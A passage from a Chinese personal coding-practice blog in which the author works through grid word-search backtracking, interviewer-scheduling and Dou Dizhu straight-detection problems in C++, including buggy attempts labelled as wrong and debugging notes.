if(check(a,row+1,col,s,i+1,visit))</span><br><span class="line">              result=true;</span><br><span class="line">         &#125;</span><br><span class="line">      //else if(col-1&gt;=0&amp;&amp;visit[row][col-1]==0)//左</span><br><span class="line">       if(col-1&gt;=0&amp;&amp;visit[row][col-1]==0)//左</span><br><span class="line">         &#123;</span><br><span class="line">            // check(a,row,col-1,s,i+1,visit);</span><br><span class="line">            if(check(a,row,col-1,s,i+1,visit))</span><br><span class="line">            result=true;</span><br><span class="line">         &#125;</span><br><span class="line">     // else if(col+1&lt;=a.size()&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line">     if(col+1&lt;=a.size()&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line">         &#123;</span><br><span class="line">           // check(a,row,col+1,s,i+1,visit);</span><br><span class="line">           if(check(a,row,col+1,s,i+1,visit))</span><br><span class="line">           result=true;</span><br><span class="line">         &#125;</span><br><span class="line">   //   else</span><br><span class="line">     // &#123;</span><br><span class="line">    </span><br><span class="line">      // &#125;</span><br><span class="line">          cout&lt;&lt;&quot;delete row &quot;&lt;&lt;row&lt;&lt;&quot;,col &quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">          res.pop_back();</span><br><span class="line">          res.pop_back();</span><br><span class="line">       </span><br><span class="line">           visit[row][col]=0;</span><br><span class="line">         </span><br><span class="line">          return result;</span><br><span class="line">     // &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好的，新问题出现，这只适用于入口在0,0的地方，如果是其它地方嘞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">A,C,C,F</span><br><span class="line">C,D,E,D</span><br><span class="line">B,E,S,S</span><br><span class="line">F,E,C,A</span><br><span class="line">FDSA</span><br><span class="line">no match~~~~</span><br><span class="line">0,0 A, s[i]0 F</span><br><span class="line">no match~~~~</span><br><span class="line">0,1 C, s[i]0 F</span><br><span class="line">no match~~~~</span><br><span class="line">0,2 C, s[i]0 F</span><br><span class="line">input row 0,col 3</span><br><span class="line">input row 1,col 3</span><br><span class="line">input row 2,col 3</span><br><span class="line">input row 3,col 3</span><br><span class="line">//哦豁？？？？？？？？？？？？？</span><br><span class="line">//1.都没有写进去咩？</span><br><span class="line">//2.不回溯啦？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很好，试探了一下，if(i==s.size()-1)才会执行，塔喵的，那不就少一个坐标了</span><br><span class="line">所以是什么导致i不加了，使得不能=s.size()了</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">问题在这里 if(col+1&lt;=a.size()&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line"></span><br><span class="line">如果a是4行4列</span><br><span class="line">现在已经是a[3][3]的位置了，那就是最右下角了</span><br><span class="line">这个时候因为3+1==4，是满足滴，所以可以继续执行函数，但是嘞a[3][4]是溢出了滴，懂了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这样改</span><br><span class="line">if(col+1&lt;a.size()&amp;&amp;visit[row][col+1]==0)//右</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int n=a.size();</span><br><span class="line">  vector&lt;vector&lt;int&gt;&gt; visit(n, vector&lt;int&gt;(n, 0));</span><br><span class="line">  for(int i=0;i&lt;n;i++)</span><br><span class="line">  for(int j=0;j&lt;n;j++)//....这没用咩？</span><br><span class="line">  &#123;</span><br><span class="line">     bool found = check(a, i, j, s, 0, visit);</span><br><span class="line">     return found;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终代码-啧，不容易"><a href="#最终代码-啧，不容易" class="headerlink" title="最终代码(啧，不容易)"></a>最终代码(啧，不容易)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;map&gt;</span><br><span class="line">#include &lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">vector&lt;int&gt; res; // 记录坐标</span><br><span class="line">vector&lt;int&gt; path;</span><br><span class="line">bool check(vector&lt;vector&lt;char&gt;&gt; a, int row, int col, string s, int i, vector&lt;vector&lt;int&gt;&gt; &amp;visit)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   int n = a.size();</span><br><span class="line">   if (col &gt;= a.size() || row &gt;= a.size() || col &lt; 0 || row &lt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">      return false;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   if (i == s.size())</span><br><span class="line">   &#123;</span><br><span class="line">      cout &lt;&lt; &quot;end now!!!!&quot; &lt;&lt; endl;</span><br><span class="line">      path = res;</span><br><span class="line">      return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   bool result = false;</span><br><span class="line"></span><br><span class="line">   if (a[row][col] != s[i]) // 判断找到了没</span><br><span class="line">   &#123;</span><br><span class="line">      cout &lt;&lt; &quot;no match~~~~&quot; &lt;&lt; endl;</span><br><span class="line">      cout &lt;&lt; row &lt;&lt; &quot;,&quot; &lt;&lt; col &lt;&lt; &quot; &quot; &lt;&lt; a[row][col] &lt;&lt; &quot;, s[i]&quot; &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; s[i] &lt;&lt; endl;</span><br><span class="line">      //  res.clear(); //我在这里清空</span><br><span class="line">      return false;</span><br><span class="line">   &#125;</span><br><span class="line">   res.push_back(row);</span><br><span class="line">   res.push_back(col);</span><br><span class="line">   // else if(a[row][col]==s[i])//找到了</span><br><span class="line">   // &#123;</span><br><span class="line">   //  res.push_back(row);</span><br><span class="line">   //  res.push_back(col);</span><br><span class="line">   cout &lt;&lt; &quot;input row &quot; &lt;&lt; row &lt;&lt; &quot;,col &quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   // i++;</span><br><span class="line">   visit[row][col] = 1;</span><br><span class="line"></span><br><span class="line">   if (row - 1 &gt;= 0 &amp;&amp; visit[row - 1][col] == 0) // 上</span><br><span class="line">   &#123;</span><br><span class="line">      // check(a,row-1,col,s,i+1,visit);</span><br><span class="line"></span><br><span class="line">      if (check(a, row - 1, col, s, i + 1, visit))</span><br><span class="line">         result = true;</span><br><span class="line">   &#125;</span><br><span class="line">   // else if(row+1&lt;=a.size()&amp;&amp;visit[row+1][col]==0)//下</span><br><span class="line">   if (row + 1 &lt; a.size() &amp;&amp; visit[row + 1][col] == 0) // 下</span><br><span class="line">   &#123;</span><br><span class="line">      //  row=row+1;</span><br><span class="line">      //  i++;</span><br><span class="line">      //  check(a,row+1,col,s,i+1,visit);</span><br><span class="line">      if (check(a, row + 1, col, s, i + 1, visit))</span><br><span class="line">         result = true;</span><br><span class="line">   &#125;</span><br><span class="line">   // else if(col-1&gt;=0&amp;&amp;visit[row][col-1]==0)//左</span><br><span class="line">   if (col - 1 &gt;= 0 &amp;&amp; visit[row][col - 1] == 0) // 左</span><br><span class="line">   &#123;</span><br><span class="line">      // check(a,row,col-1,s,i+1,visit);</span><br><span class="line">      if (check(a, row, col - 1, s, i + 1, visit))</span><br><span class="line">         result = true;</span><br><span class="line">   &#125;</span><br><span class="line">   // else if(col+1&lt;=a.size()&amp;&amp;visit[row][col+1]==0)//右</span><br><span class="line">   if (col + 1 &lt; a.size() &amp;&amp; visit[row][col + 1] == 0) // 右</span><br><span class="line">   &#123;</span><br><span class="line">      // check(a,row,col+1,s,i+1,visit);</span><br><span class="line">      if (check(a, row, col + 1, s, i + 1, visit))</span><br><span class="line">         result = true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; &quot;delete row &quot; &lt;&lt; row &lt;&lt; &quot;,col &quot; &lt;&lt; col &lt;&lt; endl;</span><br><span class="line">   res.pop_back();</span><br><span class="line">   res.pop_back();</span><br><span class="line"></span><br><span class="line">   // 那我不pop了好吧，我直接添加，大不了倒叙排列</span><br><span class="line">   // 但是这等于添加了所有路径,怎么筛选嘞</span><br><span class="line">   // 我武断地讲，找个时机，遇到false了,清除一下res，</span><br><span class="line">   // 要么把所有路径存起来咯</span><br><span class="line">   visit[row][col] = 0;</span><br><span class="line"></span><br><span class="line">   return result;</span><br><span class="line">   // &#125;</span><br><span class="line">&#125;</span><br><span class="line">bool exist(vector&lt;vector&lt;char&gt;&gt; a, string s)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   int n = a.size();</span><br><span class="line">   vector&lt;vector&lt;int&gt;&gt; visit(n, vector&lt;int&gt;(n, 0));</span><br><span class="line">   for (int i = 0; i &lt; n; i++)</span><br><span class="line">      for (int j = 0; j &lt; n; j++) // 在我看来，这是为了确定入口的位置</span><br><span class="line">      &#123;</span><br><span class="line">         bool found = check(a, i, j, s, 0, visit);</span><br><span class="line">         if (found)	//必要性，是true了，才要对吧，不然就算了</span><br><span class="line">            return found;</span><br><span class="line">      &#125;</span><br><span class="line">   return false;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int n;</span><br><span class="line">   cin &gt;&gt; n;</span><br><span class="line">   // cin.ignore();</span><br><span class="line">   string s, t;</span><br><span class="line">   vector&lt;vector&lt;char&gt;&gt; a(n, vector&lt;char&gt;(n));</span><br><span class="line">   // vector&lt;string&gt; a(n);</span><br><span class="line"></span><br><span class="line">   for (int i = 0; i &lt; n; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      cin &gt;&gt; s;</span><br><span class="line">      int j = 0;</span><br><span class="line">      for (int k = 0; k &lt; s.size(); k++)</span><br><span class="line">      &#123;</span><br><span class="line">         if (s[k] != &#x27;,&#x27;)</span><br><span class="line">         &#123;</span><br><span class="line">            a[i][j] = s[k];</span><br><span class="line">            j++;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      //  a.push_back(tt);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   string tt;</span><br><span class="line">   cin &gt;&gt; tt;</span><br><span class="line"></span><br><span class="line">   //  search(a,tt,0,0,0);</span><br><span class="line">   // cout&lt;&lt;a[0][1];</span><br><span class="line">   int flag = 1;</span><br><span class="line"></span><br><span class="line">   // int i = 0, j = 0;</span><br><span class="line">   // bool found = check(a, i, j, tt, 0, visit);//2.只能保证开头0,0是入口的情况</span><br><span class="line"></span><br><span class="line">   vector&lt;vector&lt;int&gt;&gt; visit(n, vector&lt;int&gt;(n, 0));</span><br><span class="line">   bool found = exist(a, tt);</span><br><span class="line">    if(found)</span><br><span class="line">   &#123;</span><br><span class="line">         for (int i = 0; i &lt; path.size(); i++)</span><br><span class="line">   &#123;</span><br><span class="line">      cout &lt;&lt; path[i];</span><br><span class="line">      if (i != path.size() - 1)</span><br><span class="line">         cout &lt;&lt; &quot;,&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else cout&lt;&lt;&quot;N&quot;;</span><br><span class="line">   cout &lt;&lt; endl</span><br><span class="line">        &lt;&lt; res.size() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>哎，不容易。</p>
<h1 id="68-招聘"><a href="#68-招聘" class="headerlink" title="68.招聘"></a>68.招聘</h1><p><strong>重叠区间问题</strong></p>
<h2 id="题目描述-25"><a href="#题目描述-25" class="headerlink" title="题目描述"></a>题目描述</h2><p>某公司组织一场公开招聘活动，假设由于人数和场地的限制，<br>每人每次面试的时长不等，并已经安排给定，<br>用<code>(S1,E1)</code>、<code>(S2,E2)</code>、<code>(Sj,Ej)</code>…(<code>Si &lt; Ei</code>，均为非负整数)表示每场面试的开始和结束时间。<br>面试采用一对一的方式，即一名面试官同时只能面试一名应试者，<br>一名面试官完成一次面试后可以立即进行下一场面试，且每个面试官的面试人次不超过<code>m</code>。<br>为了支撑招聘活动高效顺利进行，请你计算至少需要多少名面试官。</p>
<h2 id="输入描述-34"><a href="#输入描述-34" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入的第一行为面试官的最多面试人次m，第二行为当天总的面试场次n，<br>接下来的n行为每场面试的起始时间和结束时间，起始时间和结束时间用空格分隔。<br>其中，<code>1 &lt;= n, m &lt;= 500</code></p>
<h2 id="输出描述-34"><a href="#输出描述-34" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个整数，表示至少需要的面试官数量。</p>
<h2 id="示例一-20"><a href="#示例一-20" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-29"><a href="#输入-29" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">5</span><br><span class="line">1 2</span><br><span class="line">2 3</span><br><span class="line">3 4</span><br><span class="line">4 5</span><br><span class="line">5 6</span><br></pre></td></tr></table></figure>



<h3 id="输出-28"><a href="#输出-28" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>



<h3 id="说明-5"><a href="#说明-5" class="headerlink" title="说明"></a>说明</h3><p>总共有<code>5</code>场面试<br>且面试时间都不重叠<br>但每个面试官最多只能面试<code>2</code>人次<br>所以需要<code>3</code>名面试官</p>
<h2 id="示例二-3"><a href="#示例二-3" class="headerlink" title="示例二"></a>示例二</h2><h3 id="输入-30"><a href="#输入-30" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">3</span><br><span class="line">1 2</span><br><span class="line">2 3</span><br><span class="line">3 4</span><br></pre></td></tr></table></figure>



<h3 id="输出-29"><a href="#输出-29" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>



<h3 id="说明-6"><a href="#说明-6" class="headerlink" title="说明"></a>说明</h3><p>总共有<code>3</code>场面时，面试时间都不重叠<br>每个面试官最多能面试<code>3</code>人次<br>所以只需要一名面试官</p>
<h2 id="示例三"><a href="#示例三" class="headerlink" title="示例三"></a>示例三</h2><h3 id="输入-31"><a href="#输入-31" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">3</span><br><span class="line">8 35</span><br><span class="line">5 10</span><br><span class="line">1 3</span><br></pre></td></tr></table></figure>



<h3 id="输出-30"><a href="#输出-30" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-21"><a href="#个人代码-21" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">struct mianshi&#123;</span><br><span class="line">    int l,r;</span><br><span class="line">    bool operator()(mianshi &amp;a,mianshi &amp;b)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        return a.l&lt;b.l||(a.l==b.l&amp;&amp;a.r&lt;b.r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int chongdie(vector&lt;mianshi&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    int co=0;</span><br><span class="line">    mianshi pre;</span><br><span class="line">    pre.l=a[0].l;</span><br><span class="line">    pre.r=a[0].r;</span><br><span class="line">    for(int i=1;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(pre.r&gt;a[i].l&amp;&amp;pre.l&lt;a[i].r)</span><br><span class="line">           co++;</span><br><span class="line">           //1.一开始少了这一步</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            pre.l=a[i].l;</span><br><span class="line">            pre.r=a[i].r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return co;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int m,n;//一人最多面试m，总共面试n次</span><br><span class="line">    //没有重叠部分,n/m次，除不尽就加1</span><br><span class="line">    //有重叠部分,(n/m)+1</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    vector&lt;mianshi&gt; list;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">      //  a[i].push_back(&#123;a,b&#125;);</span><br><span class="line">        mianshi ms;</span><br><span class="line">        ms.l=a;</span><br><span class="line">        ms.r=b;</span><br><span class="line">        list.push_back(ms);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sort(list.begin(),list.end(),mianshi());</span><br><span class="line">    cout&lt;&lt;list.size()&lt;&lt;endl;</span><br><span class="line">    int co=chongdie(list);</span><br><span class="line">    cout&lt;&lt;co&lt;&lt;endl;</span><br><span class="line">    for(auto al:list)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;al.l&lt;&lt;&quot;,&quot;&lt;&lt;al.r&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     int num=(n%m==0?n/m:(n/m)+1);</span><br><span class="line">    if(co!=0)</span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        cout&lt;&lt;num+co;</span><br><span class="line">    &#125;</span><br><span class="line">    else cout&lt;&lt;num;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="69-斗地主顺子"><a href="#69-斗地主顺子" class="headerlink" title="69.斗地主顺子"></a>69.斗地主顺子</h1><h2 id="题目描述-26"><a href="#题目描述-26" class="headerlink" title="题目描述"></a>题目描述</h2><p>在斗地主扑克牌游戏中，扑克牌由小到大的顺序为<code>3 4 5 6 7 8 9 10 J Q K A 2</code><br>玩家可以出的扑克牌阵型有，<code>单张</code>，<code>对子</code>，<code>顺子</code>，<code>飞机</code>，<code>炸弹</code>等<br>其中顺子的出牌规则为，由至少5张由小到大连续递增的扑克牌组成<br>且不能包含<code>2</code><br>例如:<code>&#123;3,4,5,6,7&#125;</code>、<code>&#123;3,4,5,6,7,8,9,10,J,Q,K,A&#125;</code>都是有效的顺子<br>而<code>&#123;J,Q,K,A,2&#125;</code>、<code>&#123;2,3,4,5,6&#125;</code>、<code>&#123;3,4,5,6&#125;</code>、<code>&#123;3,4,5,6,8&#125;</code>等都不是顺子<br>给定一个包含<code>13</code>张牌的数组，如果有满足出牌规则的顺子，请输出顺子<br>如果存在多个顺子，请每行输出一个顺子<br>且需要按照顺子的第一张牌的大小(必须从小到大)依次输出<br>如果没有满足出牌规则的顺子，请输出<code>No</code></p>
<h2 id="输入描述-35"><a href="#输入描述-35" class="headerlink" title="输入描述"></a>输入描述</h2><p>13张任意顺序的扑克牌，每张扑克牌数字用空格隔开，<br>每张扑克牌的数字都是合法的<br>并且不包括大小王：<code>2 9 J 2 3 4 K A 7 9 A 5 6</code><br>不需要考虑输入为异常字符的情况</p>
<h2 id="输出描述-35"><a href="#输出描述-35" class="headerlink" title="输出描述"></a>输出描述</h2><p>组成的顺子 每张扑克牌数字用空格隔开<br><code>3 4 5 6 7</code></p>
<h2 id="示例一-21"><a href="#示例一-21" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-32"><a href="#输入-32" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 9 J 2 3 4 K A 7 9 A 5 6</span><br></pre></td></tr></table></figure>

<h3 id="输出-31"><a href="#输出-31" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 4 5 6 7</span><br></pre></td></tr></table></figure>

<h2 id="代码（错误）"><a href="#代码（错误）" class="headerlink" title="代码（错误）"></a>代码（错误）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void zhuanhuan1(vector&lt;string&gt; &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i]==&quot;J&quot;) a[i]=&quot;11&quot;;</span><br><span class="line">        else if(a[i]==&quot;Q&quot;) a[i]=&quot;12&quot;;</span><br><span class="line">        else if(a[i]==&quot;K&quot;) a[i]=&quot;13&quot;;</span><br><span class="line">        else if(a[i]==&quot;A&quot;) a[i]=&quot;14&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void zhuanhuan2(vector&lt;string&gt; &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i]==&quot;11&quot;) a[i]=&quot;J&quot;;</span><br><span class="line">        else if(a[i]==&quot;12&quot;) a[i]=&quot;Q&quot;;</span><br><span class="line">        else if(a[i]==&quot;13&quot;) a[i]=&quot;K&quot;;</span><br><span class="line">        else if(a[i]==&quot;14&quot;) a[i]=&quot;A&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bool cmp(string &amp;a,string &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    int c1=stoi(a);</span><br><span class="line">    int c2=stoi(b);</span><br><span class="line">    return c1&lt;c2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;string&gt; res;</span><br><span class="line">vector&lt;string&gt; path;</span><br><span class="line">void shunzi(vector&lt;string&gt; a)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int diff=0;</span><br><span class="line">    int i=0,j=1;</span><br><span class="line">    while(i&lt;13)</span><br><span class="line">    &#123;</span><br><span class="line">        //int pre=;</span><br><span class="line">        while(stoi(a[i])==2) i++;</span><br><span class="line">        int pre=stoi(a[i]);</span><br><span class="line">      </span><br><span class="line">        while(stoi(a[j]) == 2) j++;</span><br><span class="line">          int cur = stoi(a[j]);</span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;&quot;now pre= &quot;&lt;&lt;pre&lt;&lt;&quot;noew cur= &quot;&lt;&lt;cur&lt;&lt;endl;</span><br><span class="line">      //  res.push_back(to_string(pre));</span><br><span class="line">        if (cur - pre == diff)</span><br><span class="line">        &#123;</span><br><span class="line">            diff++;</span><br><span class="line">            cout&lt;&lt;&quot;insert &quot;&lt;&lt;cur&lt;&lt;&quot;,diff= &quot;&lt;&lt;diff&lt;&lt;endl;</span><br><span class="line">            res.push_back(to_string(cur));</span><br><span class="line">        &#125;</span><br><span class="line">        else // 3456777789</span><br><span class="line">        &#123;</span><br><span class="line">           // dfindex=j;</span><br><span class="line">           int chongfu=diff-1;</span><br><span class="line">        if(cur-pre!=chongfu)//也不重复(6777789) 而是679</span><br><span class="line">        &#123;</span><br><span class="line">              i=j;</span><br><span class="line">              diff=0;</span><br><span class="line">        &#125; </span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(j==13)//cur遍历完了</span><br><span class="line">          &#123;</span><br><span class="line">            break;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      //  if(j==0&amp;&amp;res.size()&lt;5)//至少够5连</span><br><span class="line">    //    if(res.size()&lt;5)</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         res.clear();</span><br><span class="line">    //     &#125;</span><br><span class="line">    //     else if(res.size()&gt;=5)</span><br><span class="line">    //     &#123;</span><br><span class="line">    //         path=res;</span><br><span class="line">    //         //dfindex=j;</span><br><span class="line">    //         path.push_back(&quot;!&quot;);</span><br><span class="line">    //     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        //i++;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;string&gt; a13(13); //不用char，有一个10</span><br><span class="line">    for(int i=0;i&lt;13;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a13[i];</span><br><span class="line">    &#125;</span><br><span class="line">    zhuanhuan1(a13);</span><br><span class="line">    sort(a13.begin(),a13.end(),cmp);</span><br><span class="line">    </span><br><span class="line">       for(auto a:a13)</span><br><span class="line">     cout&lt;&lt;a&lt;&lt;&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    shunzi(a13);</span><br><span class="line">    for(auto a:res)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;a&lt;&lt;&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    // zhuanhuan2(a13);</span><br><span class="line">    // for(auto a:a13)</span><br><span class="line">    // cout&lt;&lt;a&lt;&lt;&quot; &quot;;</span><br><span class="line">    //</span><br><span class="line">    //2 2 3 3 4 4 5 5 6 6 7 7 8 连队怎么办</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> void zhuanhuan1(vector&lt;string&gt; &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i]==&quot;J&quot;) a[i]=&quot;11&quot;;</span><br><span class="line">        else if(a[i]==&quot;Q&quot;) a[i]=&quot;12&quot;;</span><br><span class="line">        else if(a[i]==&quot;K&quot;) a[i]=&quot;13&quot;;</span><br><span class="line">        else if(a[i]==&quot;A&quot;) a[i]=&quot;14&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void zhuanhuan2(vector&lt;string&gt; &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i]==&quot;11&quot;) a[i]=&quot;J&quot;;</span><br><span class="line">        else if(a[i]==&quot;12&quot;) a[i]=&quot;Q&quot;;</span><br><span class="line">        else if(a[i]==&quot;13&quot;) a[i]=&quot;K&quot;;</span><br><span class="line">        else if(a[i]==&quot;14&quot;) a[i]=&quot;A&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bool cmp(string &amp;a,string &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    int c1=stoi(a);</span><br><span class="line">    int c2=stoi(b);</span><br><span class="line">    return c1&lt;c2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vector&lt;vector&lt;string&gt; &gt;path;</span><br><span class="line">void shunzi(vector&lt;string&gt; a)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int diff=1,co=1,flag=0;</span><br><span class="line">    int i=0,j=0;</span><br><span class="line">   </span><br><span class="line">    while(i&lt;13)</span><br><span class="line">    &#123;</span><br><span class="line">        vector&lt;string&gt; res;</span><br><span class="line">        flag=0;</span><br><span class="line">        diff=1;</span><br><span class="line">        while(stoi(a[i])==2) i++;</span><br><span class="line">        int fi=stoi(a[i]);</span><br><span class="line"></span><br><span class="line">        res.push_back(a[i]);</span><br><span class="line"></span><br><span class="line">        j=i+1;</span><br><span class="line">        //int pre=;</span><br><span class="line">        while(j&lt;13)</span><br><span class="line">        &#123;</span><br><span class="line">            while(stoi(a[j])==2) j++;</span><br><span class="line">            int cur=stoi(a[j]);</span><br><span class="line">      </span><br><span class="line">            if(cur-fi==diff)</span><br><span class="line">            &#123;</span><br><span class="line">                j++;</span><br><span class="line">                diff++;</span><br><span class="line">                if(diff&gt;=5) flag=1;</span><br><span class="line">                res.push_back(a[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">        if(flag==1) path.push_back(res);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哎，都不对，到时候再是哦</p>
<h2 id="最终代码-2"><a href="#最终代码-2" class="headerlink" title="最终代码"></a>最终代码</h2><p>1.用下标索引比较就好了，0-12分别记录2-A，当然直接从1开始即可</p>
<p>2.for循环作为查找下标，内循环，检查对应下标是否存在值，存在就加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void shunzi(vector&lt;string&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    //a[0]是2，不参与</span><br><span class="line">    for(int i=1;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int co=0;</span><br><span class="line">        string t=&quot;&quot;;</span><br><span class="line">        while(i&lt;a.size()&amp;&amp;a[i]!=&quot;&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            t+=a[i]+&quot; &quot;;</span><br><span class="line">            co++;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        if(co&gt;=5)</span><br><span class="line">        &#123;</span><br><span class="line">            res.push_back(t.substr(0,t.size()-1));//去掉末尾空格</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">         if(res.size()==0) cout&lt;&lt;&quot;NO&quot;;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            for(auto list:res)</span><br><span class="line">            cout&lt;&lt;list&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;string&gt; a13(13); 